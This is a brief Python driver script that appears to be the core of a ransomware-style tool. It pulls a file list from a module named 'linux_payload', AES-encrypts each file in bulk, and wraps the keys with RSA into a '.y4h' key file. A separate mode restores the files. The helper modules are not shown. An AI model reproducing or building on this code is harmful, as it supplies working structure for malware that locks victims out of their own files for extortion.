from aes_decryption import aes_decrypt
from aes_encryption import aes_encrypt
import asymmetric as Rencrypt
import RSA_decryption as Rdecrypt
import linux_payload as linux
import os
driver = int(input("Enter 1 for encryption and 2 for decryption:"))
if(driver == 1):
   onlyfiles = linux.d_main(1)
   count=1
   index = 1
   for file in onlyfiles:
      aes_encrypt(file)
      if(count % 4==0 or index == len(onlyfiles)):
          Rencrypt.d_main()
          f = open('res/key.txt.y4h','ab').write(open('res/temp_key.txt.y4h','rb').read())
          os.remove('res/temp_key.txt.y4h')
          count = 1
      count +=1
      index +=1
elif(driver == 2):
   Rdecrypt.d_main()
   onlyfiles = linux.d_main(2)
   for file in onlyfiles:
       	aes_decrypt(file)
   os.remove('res/key.txt')
